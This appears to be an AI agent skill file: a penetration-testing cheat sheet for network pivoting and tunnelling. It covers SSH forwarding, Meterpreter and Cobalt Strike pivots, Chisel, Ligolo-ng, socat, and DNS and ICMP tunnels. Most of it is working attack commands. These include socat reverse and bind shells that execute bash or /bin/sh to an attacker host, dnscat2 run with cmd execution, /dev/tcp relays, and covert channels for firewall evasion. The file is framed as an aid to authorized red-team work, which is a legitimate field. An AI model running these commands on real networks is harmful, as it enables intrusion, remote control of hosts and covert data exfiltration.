---
name: network-tunneling
description: Network tunneling and port forwarding techniques for authorized security assessments. Use this skill when you need to pivot through networks, forward ports, create SOCKS proxies, or establish covert channels during penetration testing, red teaming, or security research. Covers SSH tunneling, Meterpreter/Cobalt Strike pivoting, DNS/ICMP tunneling, and modern tools like Chisel, Ligolo-ng, and FRP. Make sure to use this skill whenever the user mentions pivoting, port forwarding, SOCKS proxy, network tunneling, SSH tunnel, or needs to access internal networks through compromised hosts.
---

# Network Tunneling and Port Forwarding

> **⚠️ Authorization Required**: Only use these techniques on systems you own or have explicit written authorization to test. Unauthorized network access is illegal.

## Quick Reference

| Technique | Use Case | Tool |
|-----------|----------|------|
| SSH Local Forward | Access internal port via compromised host | `ssh -L` |
| SSH Remote Forward | Expose local service to remote | `ssh -R` |
| SSH Dynamic (SOCKS) | Full proxy through compromised host | `ssh -D` |
| Meterpreter Port Forward | Pivot from active session | `portfwd add` |
| Chisel | High-performance reverse tunnel | `chisel` |
| Ligolo-ng | Advanced pivoting with TUN interface | `ligolo-ng` |
| DNS Tunnel | Bypass firewalls via DNS | `iodine`, `dnscat2` |
| ICMP Tunnel | Bypass via ping | `hans`, `ptunnel-ng` |
| ngrok/Cloudflared | Expose local services to internet | `ngrok`, `cloudflared` |
| FRP | Reverse proxy with SSH gateway | `frp` |

## SSH Tunneling

### Nmap Through SOCKS Proxy

> **⚠️ Important**: ICMP and SYN scans cannot be tunneled through SOCKS proxies. Disable ping discovery and use TCP scans:

```bash
proxychains nmap -n -Pn -sT -p445,3389,5985 <target>
```

### Local Port Forwarding (Port2Port)

Forward local port through compromised host to target:

```bash
# Syntax
ssh -i ssh_key <user>@<compromised_ip> -L <local_port>:<target_ip>:<target_port> [-p <ssh_port>] [-N -f]

# Example: Forward local 631 to victim's 631 through compromised host
sudo ssh -L 631:<victim_ip>:631 -N -f -l <username> <compromised_ip>
```

### Remote Port Forwarding

Expose a port on the compromised host back to your machine:

```bash
# Local port 1521 accessible on port 10521 from everywhere
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1

# Remote port 1521 accessible on port 10521 from everywhere
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1
```

### Dynamic SOCKS Proxy

Create a SOCKS proxy through the compromised host:

```bash
ssh -f -N -D <local_port> <username>@<compromised_ip>
# Then configure proxychains to use 127.0.0.1:<local_port>
```

### Reverse Port Forwarding (DMZ to Internal)

Get reverse shells from internal hosts through a DMZ:

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now send reverse shell to dmz_internal_ip:443, capture on localhost:7000
# Requires GatewayPorts yes in /etc/ssh/sshd_config
```

### SSH VPN Tunnel

Create a TUN interface for full network routing (requires root on both ends):

```bash
# SSH config must have: PermitRootLogin yes, PermitTunnel yes
ssh root@server -w any:any  # Creates tun0 on both sides

# Client side
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0
ip link set tun0 up

# Server side
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0
ip link set tun0 up
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE

# Add route on client
route add -net 10.0.0.0/16 gw 1.1.1.1
```

### SSHuttle

Tunnel all traffic to a subnet through a host:

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.0/24

# With private key, daemon mode
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
```

> **⚠️ Security Note (CVE-2023-48795)**: The Terrapin downgrade attack can tamper with SSH handshakes. Ensure OpenSSH ≥ 9.6 or disable vulnerable ciphers (`chacha20-poly1305@openssh.com`, `*-etm@openssh.com`).

## Meterpreter Pivoting

### Port Forwarding

```bash
# Inside meterpreter session
portfwd add -l <local_port> -p <remote_port> -r <remote_host>
portfwd del -l <local_port>  # Remove
portfwd  # List all forwards
```

### SOCKS Proxy

```bash
background  # Background the session
route add <target_subnet> <netmask> <session_id>
use auxiliary/server/socks_proxy
run  # Listens on 127.0.0.1:1080

# Configure proxychains
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf
```

### Autoroute Module

```bash
background
use post/multi/manage/autoroute
set SESSION <session_id>
set SUBNET 10.1.13.0
set NETMASK 255.255.255.0
run
```

## Cobalt Strike

### SOCKS Proxy

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Use with proxychains
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### Reverse Port Forwarding

```bash
# Traffic goes: Beacon Host → Team Server → Target
rportfwd [bind_port] [forward_host] [forward_port]
rportfwd stop [bind_port]

# Traffic goes: Beacon Host → CS Client → Target
rportfwd_local [bind_port] [forward_host] [forward_port]
rportfwd_local stop [bind_port]
```

## Chisel

High-performance reverse proxy (use same version for client/server):

### SOCKS Mode

```bash
# Attacker (server)
./chisel server -p 8080 --reverse

# Victim (client)
./chisel client <attacker_ip>:8080 R:socks
# Now use proxychains with 127.0.0.1:1080
```

### Port Forwarding

```bash
# Attacker
./chisel server -p 12312 --reverse

# Victim
./chisel client <attacker_ip>:12312 R:4505:127.0.0.1:4505
# Access victim's 4505 via attacker's 4505
```

## Ligolo-ng

Advanced pivoting with TUN interface support:

### Basic Tunnel

```bash
# Attacker - Start proxy
sudo ./proxy -selfcert
interface_create --name "ligolo"
certificate_fingerprint  # Note the fingerprint

# Victim - Connect agent
./agent -connect <attacker_ip>:11601 -v -accept-fingerprint <fingerprint>

# Attacker - Manage session
session
1  # Select agent
tunnel_start --tun "ligolo"
ifconfig
interface_add_route --name "ligolo" --route <network>/<netmask>
```

### Port Forwarding

```bash
# Forward agent's port 30000 to attacker's 10000
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
listener_list

# Access agent's local services
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

Reverse tunnel with SOCKS proxy (127.0.0.1:1080):

```bash
# Attacker
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080

# Victim
python client.py --server-ip <attacker_ip> --server-port 9999

# Through NTLM proxy
python client.py --server-ip <attacker_ip> --server-port 9999 \
  --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 \
  --domain CONTOSO.COM --username Alice --password P@ssw0rd

# With hashes
python client.py --server-ip <attacker_ip> --server-port 9999 \
  --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 \
  --domain CONTOSO.COM --username Alice \
  --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## Socat

### Bind Shell

```bash
# Victim
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

# Attacker
socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse Shell

```bash
# Attacker
socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0

# Victim
socat TCP4:<attacker_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port Forwarding

```bash
socat TCP4-LISTEN:<local_port>,fork TCP4:<target_ip>:<target_port> &

# Through SOCKS
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Tunnel

```bash
# Generate certificates (both sides)
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem

# Attacker
socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh

# Victim
socat STDIO OPENSSL-CONNECT:<attacker_ip>:433,cert=client.pem,cafile=server.crt
```

## Windows Tools

### Netsh Port Proxy

```bash
# Create forward (requires local admin)
netsh interface portproxy add v4tov4 \
  listenaddress=0.0.0.0 listenport=4444 \
  connectaddress=10.10.10.10 connectport=4444

# List forwards
netsh interface portproxy show v4tov4

# Delete forward
netsh interface portproxy delete v4tov4 \
  listenaddress=0.0.0.0 listenport=4444
```

### Plink (Windows SSH Client)

```bash
# Reverse port forward from victim to attacker
echo y | plink.exe -l <username> -pw <password> \
  -R <attacker_port>:<next_ip>:<final_port> <attacker_ip>

# Example
echo y | plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41
```

### SocksOverRDP

```bash
# Attacker - Register plugin
regsvr32.exe SocksOverRDP-Plugin.dll

# Connect via RDP (mstsc.exe), plugin listens on 127.0.0.1:1080

# Victim - Run server
SocksOverRDP-Server.exe

# Verify on attacker
netstat -antb | findstr 1080

# Configure Proxifier to use 127.0.0.1:1080
```

## DNS Tunneling

### Iodine

```bash
# Attacker
iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com

# Victim
iodine -f -P P@ssw0rd tunneldomain.com -r
# Victim accessible at 1.1.1.2

# Compressed SSH through tunnel
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

```bash
# Attacker
ruby ./dnscat2.rb tunneldomain.com

# Victim
./dnscat2 tunneldomain.com

# Internal network CTF
ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
./dnscat2 --dns host=10.10.10.10,port=5353

# PowerShell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd

# Port forwarding
session -i <session_id>
listen 127.0.0.1:8080 10.0.0.20:80
```

## ICMP Tunneling

### Hans

```bash
# Attacker (server)
./hans -v -f -s 1.1.1.1 -p P@ssw0rd

# Victim (client)
./hans -f -c <attacker_ip> -p P@ssw0rd -v

# After connection, victim is at 1.1.1.100
ping 1.1.1.100
```

### ptunnel-ng

```bash
# Victim (server - must receive ICMP)
sudo ptunnel-ng

# Attacker (client)
sudo ptunnel-ng -p <victim_ip> -l 2222 -r 127.0.0.1 -R 22

# SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1

# SOCKS through ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## Cloud-Based Tunnels

### ngrok

```bash
# TCP tunnel
./ngrok tcp 4444
# Result: 0.tcp.ngrok.io:12345

# HTTP file server
./ngrok http file:///tmp/httpbin/

# Internal HTTP service
./ngrok http localhost:8080 --host-header=rewrite
./ngrok http localhost:8080 --auth="user:pass"

# Configuration (ngrok.yaml)
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

### Cloudflared

```bash
# Quick tunnel
cloudflared tunnel --url http://localhost:8080
# Result: https://<random>.trycloudflare.com

# SOCKS5 proxy
cloudflared tunnel --url socks5://localhost:1080 --socks5

# Persistent tunnel
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
cloudflared tunnel run mytunnel
```

### FRP (Fast Reverse Proxy)

```bash
# Attacker (frps)
./frps -c frps.toml  # Listens on 0.0.0.0:7000

# Victim (frpc)
./frpc -c frpc.toml

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name = "rdp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 5000

# SSH Gateway (v0.53+, no frpc needed)
# frps.toml: sshTunnelGateway.bindPort = 2200
# Victim:
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

## Bash Port Forwarding

### Multi-hop Forwarding

```bash
# Jump server: connect port 3333 to 5985
mknod backpipe p
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# InternalA (accessible from Jump, can reach InternalB)
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From host, access InternalB via Jump
evil-winrm -u username -i Jump
```

## reGeorg

Web-based tunneling (upload web shell first):

```bash
python reGeorgSocksProxy.py -p 8080 -u http://victim:8080/tunnel/tunnel.jsp
# Supports: .ashx, .aspx, .js, .jsp, .php
```

## NTLM Proxy Bypass

### Cntlm

```bash
# /etc/cntlm.conf
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attacker_ip>:443

# Now SSH to localhost:2222 goes through NTLM proxy to attacker:443
```

### OpenVPN

```bash
# In openvpn.conf
http-proxy <proxy_ip> 8080 <creds_file> ntlm
```

## Bash Helper Scripts

See `scripts/` directory for:
- `ssh-tunnel-config.sh` - Generate SSH tunnel configurations
- `proxychains-config.sh` - Configure proxychains for various proxies
- `socat-tunnel.sh` - Quick socat tunnel setup

## Best Practices

1. **Always verify authorization** before testing
2. **Document all pivots** for reporting
3. **Use encrypted tunnels** (SSH, SSL) when possible
4. **Clean up** temporary forwards and tunnels
5. **Test connectivity** after establishing tunnels
6. **Consider performance** - some tunnels are slow (DNS, ICMP)
7. **Check for Terrapin vulnerability** in SSH versions
8. **Use appropriate tools** for the scenario:
   - SSH: When SSH access exists
   - Meterpreter: Active sessions
   - Chisel/Ligolo: High-performance needs
   - DNS/ICMP: When only those protocols allowed
   - Cloud tunnels: When egress is restricted

## Troubleshooting

| Issue | Solution |
|-------|----------|
| SSH tunnel fails | Check `GatewayPorts yes` in sshd_config |
| Proxychains not working | Verify proxy type (socks4/socks5/http) |
| Slow DNS tunnel | Use compression: `ssh -C -c blowfish-cbc` |
| ICMP blocked | Try DNS tunneling instead |
| Port already in use | Use different local port |
| Certificate errors | Regenerate certs or disable verification |

## References

- [HackTricks Tunneling](https://book.hacktricks.xyz/pentesting/pivot/tunneling-and-port-forwarding)
- [Chisel GitHub](https://github.com/jpillora/chisel)
- [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [FRP GitHub](https://github.com/fatedier/frp)
- [Rpivot GitHub](https://github.com/klsecservices/rpivot)
